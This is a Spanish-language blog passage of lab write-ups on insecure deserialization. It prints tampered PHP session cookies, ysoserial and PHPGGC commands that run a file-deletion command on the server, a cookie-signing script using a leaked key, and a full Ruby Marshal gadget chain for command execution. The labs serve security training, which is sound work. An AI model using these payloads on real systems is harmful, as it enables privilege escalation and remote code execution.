+<p>En términos generales, hay dos enfoques que puede tomar al manipular objetos serializados. Puede editar el objeto directamente en su forma de flujo de bytes o puede escribir un script breve en el lenguaje de programación correspondiente para crear y serializar el nuevo objeto. El último enfoque suele ser más fácil cuando se trabaja con formatos de serialización binarios.</p>
+
+<ul>
+  <li><strong>Modificación de atributos de objetos</strong>:</li>
+</ul>
+
+<p>Al manipular los datos, siempre que el atacante conserve un objeto serializado válido, el proceso de deserialización creará un objeto del lado del servidor con los valores de atributos modificados.</p>
+
+<p>Como ejemplo simple, considere un sitio web que utiliza un <em>User</em> objeto serializado para almacenar datos sobre la sesión de un usuario en una cookie. Si un atacante detecta este objeto serializado en una solicitud HTTP, podría decodificarlo para encontrar el siguiente flujo de bytes:</p>
+
+<pre><code class="language-default">O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
+</code></pre>
+
+<p>Ahí podemos observar que el objeto User tiene un atributo booleano, isAdmin que tiene valor 0, indicando presumiblemente que se trata de un usuario normal. Interceptando la request y cambiando el valor booleano del objeto deserializado y volver a serializarlo. Evidentemente, de forma aislada esto no tiene efecto, pero al volver a codificar el objeto, la cookie se sobreescribe alterando los permisos del usuario.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$user</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">isAdmin</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// allow access to admin interface }</span>
+</code></pre></div></div>
+
+<p>Este código vulnerable crearía una instancia de un <em>User</em> objeto en función de los datos de la cookie, incluido el <em>isAdmin</em> atributo modificado por el atacante. En ningún momento se comprueba la autenticidad del objeto serializado. Luego, estos datos se pasan a la declaración condicional y, en este caso, permitirían una fácil escalada de privilegios.</p>
+
+<p>Este escenario simple no es común en la naturaleza. Sin embargo, editar un valor de atributo de esta manera demuestra el primer paso para acceder a la enorme cantidad de superficie de ataque expuesta por la deserialización insegura.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: Modifying serialized objects</strong></p>
+
+<p>Este laboratorio simula una aplicación web que utiliza una sesión manejada desde la serialización y, por ende, es vulnerable a una escalada de privilegios. El laboratorio se resuelve ganando privilegios de admin y borrando al usuario carlos. Disponemos de las credenciales wiener:peter.</p>
+
+<p>En primer lugar, como sabemos que la sesión está manejada desde la serialización, la cookie de sessión debe tener información sobre las características del usuario. Así, introducimos el valor de la cookie en Decodify para comprobar si se consigue descifrar la misma:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220506112753.png" text-align="center" />
+</div>
+
+<p>Así, podemos observar que efectivamente se trata de un objeto PHP deserializado y cifrado en base64. De entre los atributos podemos observar uno que es isAdmin que se trata de un valor booleano que tiene valor 0. Cogemos el string entero, le cambiamos el 0 por el 1 y lo llevamos al codificador de Burp, donde lo codificamos en Base64:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220506112948.png" text-align="center" />
+</div>
+
+<p>Seguidamente, sustituimos la cookie verdadera por la maliciosa y al liberar la request observamos que tenemos acceso al panel de administrador.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220506113031.png" text-align="center" />
+</div>
+
+<p>Así, terminaríamos el laboratorio accediendo a dicho panel (perseverando en el cambio de la cookie con la intercepción de cada request) y borrando al usuario carlos.</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Modificar tipos de datos</strong></li>
+</ul>
+
+<p>Hemos visto cómo puede modificar valores de atributos en objetos serializados, pero también es posible proporcionar tipos de datos inesperados.</p>
+
+<p>La lógica basada en PHP es particularmente vulnerable a este tipo de manipulación debido al comportamiento de su operador de comparación flexible ( ==) al comparar diferentes tipos de datos. Por ejemplo, si realiza una comparación suelta entre un número entero y una cadena, PHP intentará convertir la cadena en un número entero, lo que significa que 5 == “5”se evalúa como ’true’.</p>
+
+<p>Inusualmente, esto también funciona para cualquier cadena alfanumérica que comience con un número. En este caso, PHP convertirá efectivamente la cadena completa a un valor entero basado en el número inicial. El resto de la cadena se ignora por completo. Por lo tanto, 5 == “5 of something”  en la práctica se trata como  5 == 5 .</p>
+
+<p>Esto se vuelve aún más extraño cuando se compara una cadena con el entero 0 == “Algo” se trata como cierto porque en el string no hay números.</p>
+
+<p>Consideremos un caso en el que este operador de comparación flexible se usa junto con datos controlables por el usuario de un objeto deserializado. Esto podría resultar potencialmente en  fallas lógicas peligrosas .</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$login</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">)</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$login</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// log in successfully }</span>
+</code></pre></div></div>
+
+<p>Supongamos que un atacante modificó el atributo de la contraseña para que contuviera el número entero ’0’ en lugar de la cadena esperada. Siempre que la contraseña almacenada no comience con un número, la condición siempre regresaría ’true’, lo que permitiría omitir la autenticación. Tenga en cuenta que esto solo es posible porque la deserialización conserva el tipo de datos. Si el código obtuvo la contraseña de la solicitud directamente, ’0’ se convertiría en una cadena y la condición se evaluaría como ’false’.</p>
+
+<p>Tenga en cuenta que al modificar los tipos de datos en cualquier formato de objeto serializado, es importante recordar actualizar también las etiquetas de tipo y los indicadores de longitud en los datos serializados. De lo contrario, el objeto serializado se dañará y no se deserializará.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: Modifying serialized data types</strong></p>
+
+<p>Este laboratorio tiene un mecanismo de gestión de sesión basado en objetos serializados.</p>
+
+<p>En primer lugar, accedemos con nuestras credenciales proporcionadas wiener:peter y comprobamos las cookies, las cuales decodificamos en base64 obteniendo que se trata de un objeto serializado que contiene características importantes de la sesión del usuario como el nombre y el token de acceso.
+O:4:”User”:2:{s:8:”username”;s:6:”wiener”;s:12:”access_token”;s:32:”klgz4jz2vp8qq8ev5qpx25c2bt2m0fgq”;fQ%3d%3d</p>
+
+<p>Así, podemos elaborar la siguiente hipóteisis. El manejo de la sesión se basa en la evaluación de las dos características presentes en el cookie. Así, cambiamos por un lado el nombre de “wiener” a “administrator” y aprovechamos la vulnerabilidad descrita en el apartado anterior para igualar el token de acceso al entero 0 e intentar que de esa forma, por una malconfiguración del servidor, se de por válido:</p>
+
+<p>O:4:”User”:2:{s:8:”username”;s:13:”administrator”;s:12:”access_token”;i:0;}</p>
+
+<p>Observemos que hemos cambiado el tipo de dato que es el acces token, un entero, ‘i’ de valor 0 y como no es un string no lleva dobles comillas.</p>
+
+<p>De esa forma conseguimos una cookie de sesión valida para hacernos pasar por el administrador y de ahí accederíamos al panel de administrador y borraríamos al usuario carlos (siendo persistente con el cambio de cookie en cada request).</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Uso de la funcionalidad de la aplicación</strong></li>
+</ul>
+
+<p>Además de simplemente verificar los valores de los atributos, la funcionalidad de un sitio web también puede realizar operaciones peligrosas en los datos de un objeto deserializado. En este caso, puede usar la deserialización insegura para pasar datos inesperados y aprovechar la funcionalidad relacionada para causar daños.</p>
+
+<p>Por ejemplo, como parte de la funcionalidad “Eliminar usuario” de un sitio web, la imagen de perfil del usuario se elimina al acceder a la ruta del archivo en el atributo <strong>$user-&gt;image_location</strong> . Si $user se creó a partir de un objeto serializado, un atacante podría explotarlo pasando un objeto modificado con el ’image_location’ conjunto a una ruta de archivo arbitraria. Eliminar su propia cuenta de usuario también eliminaría este archivo arbitrario.</p>
+
+<p><br /></p>
+
+<p>**Laboratorio 3: Using application functionality to exploit insecure deserialization Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos</p>
+
+<p>Esta práctica de laboratorio utiliza un mecanismo de sesión basado en serialización. Cierta característica invoca un método peligroso en los datos proporcionados en un objeto serializado. Para resolver el laboratorio, edite el objeto serializado en la cookie de sesión y utilícelo para eliminar el archivo morale.txt del directorio de inicio de Carlos.</p>
+
+<p>Puede iniciar sesión en su propia cuenta con las siguientes credenciales: wiener:peter</p>
+
+<p>También tienes acceso a una cuenta de respaldo: gregg:rosebud</p>
+
+<p>En primer lugar, nos logeamos con nuestras credenciales y observamos que asociado a nuestra cuenta, tenemos también un avatar que consiste en un fichero imagen. Obtenemos las cookies de sesión y las decodificamos en base64 con las herramientas de BurpSuite:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220507102817.png" text-align="center" />
+</div>
+
+<p>Seguidamente, identificamos que el path del fichero antes mencionado se encuentra dentro del objeto cookie serializado y podemos realizar la hipótesis de que cuando borramos nuestra cuenta, el avatar se borra con ella siguiendo el path proporcionado por la cookie de sesión. Así, cambiando el path de dicho fichero podríamos borrar otro archivo.</p>
+
+<p>Así, cambiamos dicha ruta a /home/carlos/morale.txt y cambiamos el tamaño del fichero en cuestión como s:23.</p>
+
+<p>Seguidamente volvermos a codificar en base64</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220507102951.png" text-align="center" />
+</div>
+
+<p>Y sustituimos dicha cookie en una request POST para borrar nuestra cuenta. De esta forma, se borra nuestra cuenta y el fichero seleccionado como avatar_link que resulta ser el dichero morale.txt de Carlos.</p>
+
+<p><br /></p>
+
+<p><br /></p>
+
+<p><strong>Inyección arbitraria de objetos</strong></p>
+
+<p>Como hemos visto, ocasionalmente es posible explotar la deserialización insegura simplemente editando el objeto proporcionado por el sitio web. Sin embargo, inyectar tipos de objetos arbitrarios puede abrir muchas más posibilidades.</p>
+
+<p>En la programación orientada a objetos, los métodos disponibles para un objeto están determinados por su clase. Por lo tanto, si un atacante puede manipular qué clase de objeto se pasa como datos serializados, puede influir en qué código se ejecuta después e incluso durante la deserialización.</p>
+
+<p>Los métodos de deserialización no suelen comprobar lo que están deserializando. Esto significa que puede pasar objetos de cualquier clase serializable que esté disponible para el sitio web y el objeto se deserializará. Esto permite efectivamente que un atacante cree instancias de clases arbitrarias. El hecho de que este objeto no sea de la clase esperada no importa. El tipo de objeto inesperado puede causar una excepción en la lógica de la aplicación, pero el objeto malicioso ya habrá sido instanciado para entonces.</p>
+
+<p>Si un atacante tiene acceso al código fuente, puede estudiar todas las clases disponibles en detalle. Para construir un exploit simple, buscarían clases que contengan métodos mágicos de deserialización y luego verificarían si alguno de ellos realiza operaciones peligrosas en datos controlables. Luego, el atacante puede pasar un objeto serializado de esta clase para usar su método mágico para un exploit.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 4: Arbitrary object injection in PHP</strong></p>
+
+<p>Este laboratorio utiliza un mecanismo de sesión basado en serialización y, como resultado, es vulnerable a la inyección de objetos arbitrarios. Para resolver el laboratorio, cree e inyecte un objeto serializado malicioso para eliminar el archivo morale.txt del directorio de inicio de Carlos. Deberá obtener acceso al código fuente para resolver este laboratorio.</p>
+
+<p>Puede iniciar sesión en su propia cuenta con las siguientes credenciales: wiener:peter</p>
+
+<p>En primer lugar, observamos que el sitio web referencia un fichero:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220507111540.png" text-align="center" />
+</div>
+
+<p>Llevamos la request al Repeater y poniendo un guion torcido alfinal del nombre del fichero podemos ver el código:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220507111620.png" text-align="center" />
+</div>
+
+<p>Para interpretar este código es necesario recordar que PHP es un lenguaje orientado a objetos. Este está definido por clases que no es más que un “estereotipo” que se materializa en objetos (que son instancias de cada clase)=. Este código define cómo se procesa el objeto serializado y en el último párrafo invoka al método _destruct si en el objeto que se procesa se encuentra el atributo “lock_file_path” que borrará el fichero marcado por el path en el siguiente atributo.</p>
+
+<p>Así, con el fin de borrar el fichero “morale.txt” marcado modificamos el objeto serializado (la cookie) cambiando los atributos mencionados anteriomente como sigue a continuación:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"CustomTemplate"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"lock_file_path"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">23</span><span class="o">:</span><span class="s2">"/home/carlos/morale.txt"</span><span class="p">;}</span>
+</code></pre></div></div>
+
+<p>Cogemos el objeto y codificamos en base64 y llevamos dicha cookie a una request, de esa forma y según la lógica del código, el fichero habrá quedado borrado.</p>
+
+<p><br /></p>
+
+<h3 id="3-trabajando-con-dispositivos-en-cadena">3. Trabajando con dispositivos en cadena.</h3>
+
+<p>Un <strong>gadget</strong> (o dispositivo) es un fragmento de código que existe dentro de una aplicación web y que puede ser aprovechado por un atacante para perpetrar un acto ilícito.</p>
+
+<p>En principio, no se trata de algo intrínsecamente dañino al fin y al cabo el atacante no tiene el control del código, este ya existe dentro de la aplicación web. Sin embargo, por cuestiones de malconfiguración, un atacante podría inyectar código con el que podría llegar a obtener un comportamiento malicioso de uno o una cadena de estos gadgets debido a que, a menudo, el input del atacante pasa de un dispositivo a otro hasta que llega al gadget en el que realmente el payload resulta autenticamente dañino.</p>
+
+<p>Muchas vulnerabilidades basadas en la deserialización insegura requieren de cadenas de gadgets.</p>
+
+<p>Identificar manualmente una cadena de dispositivos para llevar a cabo un exploit puede ser una tarea ardua y es casi imposible sin acceso directo al código fuente (tal y como hemos visto en el laboratorio anterior). Afortunadamente, muchas aplicaciones web suelen reutilizar código de otras aplicaciones web y heredan de esa forma exploits asociados con las cadenas de gadgets que adoptan.</p>
+
+<p>Existen muchas herramientas para identificar un rango de cadenas de dispositivos ya empleadas para explotar las mismas vulnerabilidades en otros sitios web.</p>
+
+<p><br /></p>
+
+<h4 id="31-ysoserial">3.1. ysoserial.</h4>
+
+<p>Ysoserial es un <em>proof-of-concept</em> tool que generan payloads para explotar vulnerabilidades de deserialización insegura de objetos Java. Se trata de una de las mencionadas herramientas que generan código basado en cadenas de dispositivos empleadas popularmente por diversas aplicaciones web en Java.</p>
+
+<p>Podemos descargar esta herramienta desde Github:</p>
+
+<p>https://github.com/frohoff/ysoserial</p>
+
+<p>En el apartado instalación encontraremos un link desde el que podremos descargar el .jar apropiado.
+Veámos ahora un ejemplo de cómo se utiliza esta herramienta:</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 5: Exploiting Java deserialization with Apache Commons</strong></p>
+
+<p>Este laboratorio utiliza un mecanismo de sesión basado en serialización y carga la biblioteca <em>Apache Commons Collections</em>. Aunque no tiene acceso al código fuente, aún puede explotar este laboratorio utilizando cadenas de dispositivos preconstruidos.</p>
+
+<p>Para resolver el laboratorio, use una herramienta de terceros para generar un objeto serializado malicioso que contenga una carga útil de ejecución remota de código. Luego, pase este objeto al sitio web para eliminar el archivo morale.txt del directorio de inicio de Carlos.</p>
+
+<p>Puede iniciar sesión en su propia cuenta con las siguientes credenciales: wiener:peter y accedemos a la cookie de sesión. Al decodificarla en Base64 observamos que se trata de un objeto serializado que contiene características del usuario.</p>
+
+<p>Eliminamos la cookie y en su lugar introducimos un valor arbitrario para intentar provocar un error y obtener información:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220520173908.png" text-align="center" />
+</div>
+
+<p>Ahí podemos observar que la cookie se procesa mediante código Java y por ende, el empleo de una herramienta como Ysoserial para construir un payload con el que conseguir ejecutar una acción dentro del servidor aprovechándonos del motor Java que procesa la cookie podría ser buena idea.</p>
+
+<p>Así, descargamos la herramienta e introducimos el siguiente código:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> path/to/ysoserial.jar CommonsCollections4 <span class="s1">'rm /home/carlos/morale.txt'</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+
+<p>Así, lo que hacemos es fabricar un payload utilizando el .jar para la versión de la gadget chain “CommonsCollection4” tal y como indica el enunciado para que se ejecute el comando de borrado de un fichero del usuario Carlos y luego el payload se códifique en Base64.</p>
+
+<p>La clave es introducir el output de ese comando devuelta en la cookie en cuestión y lanzarla sobre una request.</p>
+
+<p>El resultado será un error ya que no reconocerá sesión alguna, pero se ejecutará nuestro comando consiguiendo el borrado del fichero del usuario Carlos.</p>
+
+<p><br /></p>
+
+<h4 id="32-php-generic-gadget-chain">3.2. PHP Generic Gadget Chain.</h4>
+
+<p>Muchos lenguajes sufren de manera frecuente de vulnerabilidades de deserialización insegura y a menudo tienen herramientas similares a ysoserial con Java.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: Exploiting PHP deserialization with a pre-built gadget chain</strong></p>
+
+<p>Este laboratorio posee una gestión de sesión basada en la serialización de un objeto en forma de cookie. Además, emplea un marco PHP y no tiene acceso al código fuente.</p>
+
+<p>Para resolver este laboratorio, hay que utillizar una herramienta de terceros para borrar el fichero morale.txt situado en el directorio home del usuario Carlos.</p>
+
+<p>Accedemos al laboratorio y procedemos a logearnos. Al intentar descifrar la cookie observamos que se trata de un objeto serializado codificado en Base64.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220521022858.png" text-align="center" />
+</div>
+
+<p>Intentamos generar un mensaje de error para extraer información del marco de procesamietno de la cookie enviando un valor alterado de la misma obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220520183114.png" text-align="center" />
+</div>
+
+<p>Así, ya sabemos que el marco de trabajo es Symfony, que la versión es 4.3.6 y que el lenguaje de programación es PHP.</p>
+
+<p>Por otra parte, observamos en el código fuente de la página un comentario que indica la ruta a un fichero de debug:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220520184637.png" text-align="center" />
+</div>
+
+<p>En él encontramos datos relevantes entre otros, el valor de una SECRET_KEY necesaria para generar una cookie valida para el procesamiento.</p>
+
+<p>Seguidamente, descargamos PHPGGC desde el enlace: https://github.com/ambionics/phpggc y le trasladamos el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./phpggc Symfony/RCE4 <span class="nb">exec</span> <span class="s1">'rm /home/carlos/morale.txt'</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+
+<p>De esta forma, hemos obtenido un payload en forma de objeto serializado que explota un gadget chain de Symfony. En el anteior laboratorio llegados a este punto, lo hemos codificado en Base64 y desde ahí lo hemos reintroducido en el valor de la cookie y lo hemos enviado en una request con la que se ha procesado el payload.</p>
+
+<p>Sin embargo, ahora las cosas son distintas. La cookie de sesión consta de dos partes como hemos visto. Una parte que defenía las características del usuario y otra parte que contiene una firma que validad la legitimidad de la cookie. Así, para que la cookie se acepte y consigamos que el payload se procese debemos firmarla adecuadamente. Para ello empleamos el siguiente script PHP:</p>
+
+<pre><code class="language-PHP">$object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;
+</code></pre>
+
+<p>Quedando como:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220521035301.png" text-align="center" />
+</div>
+
+<p>Así, ejecutamos el script y copiamos el output sobre el valor de la cookie y enviamos la request. Terminando el laboratorio.</p>
+
+<p><br /></p>
+
+<h4 id="33-trabajando-con-gadget-chains-documentadas">3.3. Trabajando con gadget chains documentadas.</h4>
+
+<p>Es posible que no siempre haya una herramienta dedicada disponible para explotar cadenas de gadgets conocidas en el marco utilizado por la aplicación de destino.</p>
+
+<p>En este caso, siempre vale la pena buscar en línea para ver si hay vulnerabilidades documentadas que pueda adaptar manualmente. Ajustar el código puede requerir una comprensión básica del lenguaje y el marco, y es posible que a veces necesite serializar el objeto usted mismo, pero este enfoque aún requiere mucho menos esfuerzo que construir un exploit desde cero.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 7: Explotando deserialización Ruby usando una gadget chain documentada</strong>.</p>
+
+<p>Este laboratorio tiene un mecanismo de sesión basado en un objeto serializado en forma de cookie.
+Completamos un laboratorio construyendo un laboratorio que borre el fichero /morale.txt localizado en el home del usuario Carlos buscando en google Universal Deserialisation Gadget for Ruby 2.x-3.x by vakzz y lo retocamos para que quede como sigue:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span>
+<span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span>
+
+<span class="k">module</span> <span class="nn">Gem</span>
+<span class="k">class</span> <span class="nc">Requirement</span>
+<span class="k">def</span> <span class="nf">marshal_dump</span>
+<span class="p">[</span><span class="vi">@requirements</span><span class="p">]</span>
+<span class="k">end</span>
+<span class="k">end</span>
+<span class="k">end</span>
+
+<span class="n">wa1</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="no">Kernel</span><span class="p">,</span> <span class="ss">:system</span><span class="p">)</span>
+
+<span class="n">rs</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">RequestSet</span><span class="p">.</span><span class="nf">allocate</span>
+<span class="n">rs</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@sets'</span><span class="p">,</span> <span class="n">wa1</span><span class="p">)</span>
+<span class="n">rs</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@git_set'</span><span class="p">,</span> <span class="s2">"COMMAND"</span><span class="p">)</span>
+
+<span class="n">wa2</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">rs</span><span class="p">,</span> <span class="ss">:resolve</span><span class="p">)</span>
+
+<span class="n">i</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="o">::</span><span class="no">Entry</span><span class="p">.</span><span class="nf">allocate</span>
+<span class="n">i</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@read'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">i</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@header'</span><span class="p">,</span> <span class="s2">"aaa"</span><span class="p">)</span>
+
+
+<span class="n">n</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">BufferedIO</span><span class="p">.</span><span class="nf">allocate</span>
+<span class="n">n</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@io'</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">n</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@debug_output'</span><span class="p">,</span> <span class="n">wa2</span><span class="p">)</span>
+
+<span class="n">t</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="p">.</span><span class="nf">allocate</span>
+<span class="n">t</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@io'</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="p">.</span><span class="nf">allocate</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">instance_variable_set</span><span class="p">(</span><span class="s1">'@requirements'</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="no">Marshal</span><span class="p">.</span><span class="nf">dump</span><span class="p">([</span><span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span><span class="p">,</span> <span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span><span class="p">,</span> <span class="n">r</span><span class="p">])</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#burp">burp</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=17.+Insecure+Deserialization.&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-22-17.Insecure_deserialization%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-03-22-17.Insecure_deserialization%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-03-22-17.Insecure_deserialization%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2022-03-21-16.WebSockets/" data-toggle="tooltip" data-placement="top" title="16. WebSockets.">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="page-item next">
+          <a class="page-link" href="/2022-03-23-18.Serve-side_template_injection/" data-toggle="tooltip" data-placement="top" title="18. Server-Side Template Injection.">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="/feed.xml" title="RSS">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">RSS</span>
+    </a>
+  </li><li class="list-inline-item">
+    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/Qv1nTv5" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://twitter.com/Qvintvs1" title="Twitter">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Twitter</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">LinkedIn</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Qv1nTv5
+        &nbsp;&bull;&nbsp;
+      
+      2024
+
+      
+
+      
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
